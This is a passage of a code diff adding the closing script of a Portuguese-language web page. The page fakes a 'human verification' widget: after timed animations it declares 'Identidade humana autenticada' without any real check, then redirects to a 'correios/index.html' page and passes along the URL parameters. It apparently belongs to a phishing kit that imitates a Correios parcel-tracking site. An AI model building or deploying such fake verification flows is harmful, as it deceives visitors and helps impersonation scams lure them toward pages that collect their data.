+                        progress.style.width = "90%";
+                    }
+                }, 700);
+
+                // Etapa 3: Sucesso e Redirecionamento
+                setTimeout(function () {
+                    verificando = false;
+                    verificado = true;
+
+                    widget.classList.remove('loading');
+                    widget.classList.add('success');
+                    title.textContent = "Verificação Concluída!";
+                    desc.textContent = "Identidade humana autenticada";
+                    btnText.textContent = "Acessando Rastreamento...";
+                    if (progress) {
+                        progress.style.width = "100%";
+                    }
+
+                    // Redirecionamento preservando todos os parâmetros
+                    setTimeout(function () {
+                        redirecionarParaDestino();
+                    }, 600);
+                }, 1400);
+            };
+
+            function redirecionarParaDestino() {
+                var search = window.location.search || '';
+                var pathname = window.location.pathname;
+                if (!pathname.endsWith('/')) {
+                    pathname += '/';
+                }
+                window.location.href = pathname + 'correios/index.html' + search;
+            }
+
+        })();
+    </script>
+</body>
+</html>
+
